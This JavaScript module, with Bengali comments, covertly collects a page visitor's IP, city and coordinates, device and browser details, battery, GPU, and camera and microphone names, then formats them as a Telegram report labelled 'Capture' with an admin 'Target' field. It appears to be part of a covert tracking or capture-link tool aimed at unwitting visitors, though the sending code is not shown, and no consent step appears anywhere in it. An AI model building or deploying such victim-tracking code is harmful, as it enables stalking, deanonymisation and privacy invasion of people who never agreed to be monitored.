/* ============================================================
   Fingerprint Collector — সব ডিভাইস তথ্য সংগ্রহ করে
   ▸ সব API আসল, কোনো ডাটা fake নয়
   ============================================================ */

export async function collectFingerprint() {
  const fp = {};

  /* ---------- IP + Geo ---------- */
  try {
    const r = await fetch("https://ipapi.co/json/");
    const d = await r.json();
    fp.ip = d.ip || "Unknown";
    fp.country = d.country_name || "Unknown";
    fp.countryCode = d.country_code || "?";
    fp.region = d.region || "Unknown";
    fp.city = d.city || "Unknown";
    fp.postal = d.postal || "?";
    fp.latitude = d.latitude || "?";
    fp.longitude = d.longitude || "?";
    fp.timezone = d.timezone || "?";
    fp.isp = d.org || "Unknown";
    fp.asn = d.asn || "?";
  } catch {
    fp.ip = "Unknown"; fp.country = "Unknown";
  }

  /* ---------- User Agent Details ---------- */
  const ua = navigator.userAgent;
  fp.userAgent = ua;

  /* Browser */
  fp.browser = "Unknown";
  fp.browserVersion = "?";
  if (/Edg\//.test(ua))        { fp.browser = "Edge";    fp.browserVersion = ua.match(/Edg\/([\d.]+)/)?.[1]; }
  else if (/OPR\//.test(ua))   { fp.browser = "Opera";   fp.browserVersion = ua.match(/OPR\/([\d.]+)/)?.[1]; }
  else if (/Chrome\//.test(ua)){ fp.browser = "Chrome";  fp.browserVersion = ua.match(/Chrome\/([\d.]+)/)?.[1]; }
  else if (/Firefox\//.test(ua)){fp.browser = "Firefox"; fp.browserVersion = ua.match(/Firefox\/([\d.]+)/)?.[1]; }
  else if (/Safari\//.test(ua) && !/Chrome/.test(ua)) { fp.browser = "Safari"; fp.browserVersion = ua.match(/Version\/([\d.]+)/)?.[1]; }

  /* OS */
  fp.os = "Unknown";
  fp.osVersion = "?";
  if (/Windows NT 10/.test(ua))      { fp.os = "Windows"; fp.osVersion = "10/11"; }
  else if (/Windows NT/.test(ua))    { fp.os = "Windows"; fp.osVersion = ua.match(/Windows NT ([\d.]+)/)?.[1]; }
  else if (/Mac OS X/.test(ua))      { fp.os = "macOS";   fp.osVersion = ua.match(/Mac OS X ([\d_.]+)/)?.[1]?.replace(/_/g, "."); }
  else if (/Android ([\d.]+)/.test(ua)) { fp.os = "Android"; fp.osVersion = ua.match(/Android ([\d.]+)/)?.[1]; }
  else if (/iPhone|iPad|iPod/.test(ua)) { fp.os = "iOS"; fp.osVersion = ua.match(/OS ([\d_]+)/)?.[1]?.replace(/_/g, "."); }
  else if (/Linux/.test(ua))         { fp.os = "Linux";   fp.osVersion = "unknown"; }

  /* Device Type */
  fp.deviceType = "Desktop";
  if (/Mobile|Android|iPhone|iPod/.test(ua)) fp.deviceType = "Mobile";
  else if (/iPad|Tablet/.test(ua))           fp.deviceType = "Tablet";

  /* Platform */
  fp.platform = navigator.platform || "Unknown";

  /* In-App Browser Detection */
  fp.inApp = "No";
  if (/FB_IAB|FBAN|FBAV/.test(ua))       fp.inApp = "Facebook";
  else if (/Instagram/.test(ua))         fp.inApp = "Instagram";
  else if (/WhatsApp/.test(ua))          fp.inApp = "WhatsApp";
  else if (/Line\//.test(ua))            fp.inApp = "LINE";
  else if (/Twitter/.test(ua))           fp.inApp = "Twitter/X";
  else if (/TikTok/.test(ua))            fp.inApp = "TikTok";
  else if (/Snapchat/.test(ua))          fp.inApp = "Snapchat";
  else if (/Telegram/.test(ua))          fp.inApp = "Telegram";

  /* Device Model (Android) */
  fp.deviceModel = "?";
  const androidModel = ua.match(/Android [\d.]+;\s*([^)]+?)(?:\s+Build|\))/);
  if (androidModel) fp.deviceModel = androidModel[1].trim();

  /* ---------- Language ---------- */
  fp.language = navigator.language || "Unknown";
  fp.languages = (navigator.languages || []).join(", ");
  fp.languageCount = (navigator.languages || []).length;

  /* ---------- Screen ---------- */
  fp.screenWidth = screen.width;
  fp.screenHeight = screen.height;
  fp.screenAvailWidth = screen.availWidth;
  fp.screenAvailHeight = screen.availHeight;
  fp.windowWidth = window.innerWidth;
  fp.windowHeight = window.innerHeight;
  fp.pixelRatio = window.devicePixelRatio || 1;
  fp.colorDepth = screen.colorDepth || "?";
  fp.pixelDepth = screen.pixelDepth || "?";

  /* Orientation */
  fp.orientation = (screen.orientation && screen.orientation.type) || "unknown";

  /* ---------- Network ---------- */
  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  if (conn) {
    fp.networkType = conn.effectiveType || "Unknown";
    fp.downlink = conn.downlink ? conn.downlink + " Mbps" : "?";
    fp.rtt = conn.rtt !== undefined ? conn.rtt + " ms" : "?";
    fp.dataSaver = conn.saveData ? "On" : "Off";
  } else {
    fp.networkType = "Unknown";
  }
  fp.online = navigator.onLine ? "Yes" : "No";

  /* ---------- Date/Time ---------- */
  const now = new Date();
  fp.date = now.toLocaleDateString("en-GB");
  fp.time = now.toLocaleTimeString("en-GB");
  fp.timezone = fp.timezone || Intl.DateTimeFormat().resolvedOptions().timeZone;
  fp.utcOffset = now.getTimezoneOffset();
  fp.day = now.toLocaleDateString("en-GB", { weekday: "long" });

  /* ---------- Camera / Media Devices ---------- */
  fp.cameraAvailable = "No";
  fp.cameraCount = 0;
  fp.cameraPermission = "unknown";
  fp.micCount = 0;
  fp.speakerCount = 0;
  fp.cameraNames = "—";
  fp.micNames = "—";
  fp.speakerNames = "—";

  try {
    /* Permission status */
    if (navigator.permissions && navigator.permissions.query) {
      try {
        const p = await navigator.permissions.query({ name: "camera" });
        fp.cameraPermission = p.state;
      } catch {}
    }

    /* enumerate devices (labels only show after permission) */
    const devices = await navigator.mediaDevices.enumerateDevices();
    const cams = devices.filter(d => d.kind === "videoinput");
    const mics = devices.filter(d => d.kind === "audioinput");
    const spks = devices.filter(d => d.kind === "audiooutput");

    fp.cameraCount = cams.length;
    fp.micCount = mics.length;
    fp.speakerCount = spks.length;
    fp.cameraAvailable = cams.length > 0 ? "Yes" : "No";

    if (cams.length) fp.cameraNames = cams.map((c, i) => c.label || ("Camera " + (i+1))).join(" | ");
    if (mics.length) fp.micNames = mics.map((m, i) => m.label || ("Mic " + (i+1))).join(" | ");
    if (spks.length) fp.speakerNames = spks.map((s, i) => s.label || ("Speaker " + (i+1))).join(" | ");
  } catch {}

  /* ---------- Battery ---------- */
  try {
    if (navigator.getBattery) {
      const b = await navigator.getBattery();
      fp.batteryLevel = Math.round(b.level * 100) + "%";
      fp.batteryCharging = b.charging ? "Charging" : "Discharging";
      fp.batteryChargingTime = b.chargingTime === Infinity ? "?" : (b.chargingTime + "s");
      fp.batteryDischargingTime = b.dischargingTime === Infinity ? "?" : (b.dischargingTime + "s");
    } else {
      fp.batteryLevel = "Unavailable";
    }
  } catch { fp.batteryLevel = "Unavailable"; }

  /* ---------- Hardware ---------- */
  fp.cpuCores = navigator.hardwareConcurrency || "?";
  fp.deviceMemory = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "?";

  /* ---------- GPU (WebGL) ---------- */
  fp.gpu = "?";
  fp.gpuVendor = "?";
  fp.webglVersion = "?";
  fp.maxTexture = "?";
  try {
    const c = document.createElement("canvas");
    const gl = c.getContext("webgl2") || c.getContext("webgl");
    if (gl) {
      const dbg = gl.getExtension("WEBGL_debug_renderer_info");
      if (dbg) {
        fp.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) || "?";
        fp.gpuVendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) || "?";
      }
      fp.webglVersion = gl.getParameter(gl.VERSION) || "?";
      fp.maxTexture = gl.getParameter(gl.MAX_TEXTURE_SIZE) || "?";
    }
  } catch {}

  /* ---------- Touch ---------- */
  fp.touchPoints = navigator.maxTouchPoints || 0;
  fp.touchSupport = "ontouchstart" in window ? "Yes" : "No";

  /* ---------- Cookies / Storage ---------- */
  fp.cookiesEnabled = navigator.cookieEnabled ? "Yes" : "No";
  fp.doNotTrack = navigator.doNotTrack || "Not Set";
  fp.adBlocker = "Unknown";

  /* Storage quota */
  try {
    if (navigator.storage && navigator.storage.estimate) {
      const est = await navigator.storage.estimate();
      fp.storageQuota = est.quota ? (est.quota / 1024 / 1024).toFixed(0) + " MB" : "?";
      fp.storageUsage = est.usage ? (est.usage / 1024 / 1024).toFixed(2) + " MB" : "?";
    }
  } catch {}

  /* PDF Viewer support */
  fp.pdfViewer = navigator.pdfViewerEnabled ? "Yes" : "No";

  /* ---------- Page URL + Referrer ---------- */
  fp.pageUrl = window.location.href;
  fp.referrer = document.referrer || "Direct / None";

  /* ---------- UTM / Referrer Analysis ---------- */
  try {
    const u = new URL(fp.pageUrl);
    fp.urlId = u.searchParams.get("id") || "None";
    fp.utmSource = u.searchParams.get("utm_source") || "—";
    fp.utmMedium = u.searchParams.get("utm_medium") || "—";
    fp.utmCampaign = u.searchParams.get("utm_campaign") || "—";
  } catch {}

  /* ---------- Referrer Source Detection ---------- */
  fp.referrerSource = "Direct";
  const ref = fp.referrer.toLowerCase();
  if (ref.includes("facebook"))       fp.referrerSource = "Facebook";
  else if (ref.includes("instagram")) fp.referrerSource = "Instagram";
  else if (ref.includes("whatsapp"))  fp.referrerSource = "WhatsApp";
  else if (ref.includes("google"))    fp.referrerSource = "Google";
  else if (ref.includes("tiktok"))    fp.referrerSource = "TikTok";
  else if (ref.includes("twitter") || ref.includes("t.co")) fp.referrerSource = "Twitter/X";
  else if (ref.includes("telegram"))  fp.referrerSource = "Telegram";
  else if (ref)                       fp.referrerSource = "Other";

  /* ---------- Fingerprint Hash ---------- */
  try {
    const raw = [
      ua, navigator.language, screen.width, screen.height,
      screen.colorDepth, fp.pixelRatio, fp.timezone,
      navigator.hardwareConcurrency, navigator.deviceMemory,
      fp.gpu, fp.gpuVendor
    ].join("|");
    const buf = new TextEncoder().encode(raw);
    const hash = await crypto.subtle.digest("SHA-256", buf);
    fp.hash = Array.from(new Uint8Array(hash))
      .map(b => b.toString(16).padStart(2, "0")).join("").substring(0, 16);
  } catch { fp.hash = "?"; }

  return fp;
}

/* ---------- ফরম্যাট করে Telegram caption বানানো ---------- */
export function buildCaption(fp, opts = {}) {
  const { index = 1, total = 3, role = "admin", targetId = "", message = "" } = opts;
  const flag = {
    BD:"🇧🇩",IN:"🇮🇳",US:"🇺🇸",UK:"🇬🇧",GB:"🇬🇧",PK:"🇵🇰",NP:"🇳🇵",LK:"🇱🇰",
    MY:"🇲🇾",SG:"🇸🇬",AE:"🇦🇪",SA:"🇸🇦",JP:"🇯🇵",KR:"🇰🇷",CN:"🇨🇳",PH:"🇵🇭",
    ID:"🇮🇩",TH:"🇹🇭",VN:"🇻🇳",DE:"🇩🇪",FR:"🇫🇷",IT:"🇮🇹",ES:"🇪🇸",CA:"🇨🇦",
    AU:"🇦🇺",RU:"🇷🇺",BR:"🇧🇷",TR:"🇹🇷",EG:"🇪🇬",ZA:"🇿🇦"
  }[fp.countryCode] || "🌐";

  const adminSection = role === "admin" && targetId ? `👤 <b>Target:</b> <code>${targetId}</code>\n` : "";

  return (
    (message ? `${message}\n\n` : "") +
    `📸 <b>Capture ${index}/${total}</b>\n` +
    `━━━━━━━━━━━━━━━━━━━━\n` +
    adminSection +
    `📅 ${fp.date} · ${fp.time}\n` +
    `🕰️ ${fp.timezone} · ${fp.day}\n` +
    `\n` +
    `🌐 <b>IP:</b> <code>${fp.ip}</code>\n` +
    `${flag} <b>Country:</b> ${fp.country} (${fp.countryCode})\n` +
    `📍 <b>Region:</b> ${fp.region}\n` +
    `🏙️ <b>City:</b> ${fp.city}\n` +
    `📡 <b>ISP:</b> ${fp.isp}\n` +
    `🗺️ <b>Coords:</b> ${fp.latitude}, ${fp.longitude}\n` +
    `\n` +
    `💻 <b>User Agent:</b>\n<code>${fp.userAgent}</code>\n` +
    `🌐 <b>Browser:</b> ${fp.browser} ${fp.browserVersion}\n` +
    `💻 <b>OS:</b> ${fp.os} ${fp.osVersion}\n` +
    `📱 <b>Device:</b> ${fp.deviceType} · ${fp.deviceModel}\n` +
    `⚡ <b>Platform:</b> ${fp.platform}\n` +
    `📦 <b>In-App:</b> ${fp.inApp}\n` +
    `🗣️ <b>Language:</b> ${fp.language} (${fp.languages})\n` +
    `\n` +
    `📏 <b>Screen:</b> ${fp.screenWidth}×${fp.screenHeight}\n` +
    `🪟 <b>Window:</b> ${fp.windowWidth}×${fp.windowHeight}\n` +
    `🔍 <b>Pixel Ratio:</b> ${fp.pixelRatio}x\n` +
    `🎨 <b>Color:</b> ${fp.colorDepth}-bit\n` +
    `🔄 <b>Orientation:</b> ${fp.orientation}\n` +
    `\n` +
    `📶 <b>Network:</b> ${fp.networkType}\n` +
    `⬇️ <b>Downlink:</b> ${fp.downlink}\n` +
    `📡 <b>RTT:</b> ${fp.rtt}\n` +
    `💾 <b>Data Saver:</b> ${fp.dataSaver}\n` +
    `🟢 <b>Online:</b> ${fp.online}\n` +
    `\n` +
    `🔋 <b>Battery:</b> ${fp.batteryLevel} · ${fp.batteryCharging}\n` +
    `🧠 <b>CPU Cores:</b> ${fp.cpuCores}\n` +
    `💾 <b>Memory:</b> ${fp.deviceMemory}\n` +
    `🎮 <b>GPU:</b> ${fp.gpu}\n` +
    `🏭 <b>GPU Vendor:</b> ${fp.gpuVendor}\n` +
    `🖼️ <b>WebGL:</b> ${fp.webglVersion}\n` +
    `📐 <b>Max Texture:</b> ${fp.maxTexture}\n` +
    `👆 <b>Touch Points:</b> ${fp.touchPoints}\n` +
    `\n` +
    `📸 <b>Camera:</b> ${fp.cameraAvailable} (${fp.cameraCount})\n` +
    `🔐 <b>Cam Permission:</b> ${fp.cameraPermission}\n` +
    `🎥 <b>Cameras:</b> ${fp.cameraNames}\n` +
    `🎤 <b>Mics:</b> ${fp.micNames}\n` +
    `🔊 <b>Speakers:</b> ${fp.speakerNames}\n` +
    `\n` +
    `🍪 <b>Cookies:</b> ${fp.cookiesEnabled}\n` +
    `🚫 <b>DNT:</b> ${fp.doNotTrack}\n` +
    `📄 <b>PDF Viewer:</b> ${fp.pdfViewer}\n` +
    `💽 <b>Storage:</b> ${fp.storageUsage || "?"} / ${fp.storageQuota || "?"}\n` +
    `\n` +
    `🔗 <b>Page:</b> ${fp.pageUrl}\n` +
    `↩️ <b>Referrer:</b> ${fp.referrer}\n` +
    `📥 <b>Source:</b> ${fp.referrerSource}\n` +
    `🎯 <b>UTM:</b> ${fp.utmSource} / ${fp.utmMedium}\n` +
    `\n` +
    `🆔 <b>Fingerprint:</b> <code>${fp.hash}</code>`
  );
}
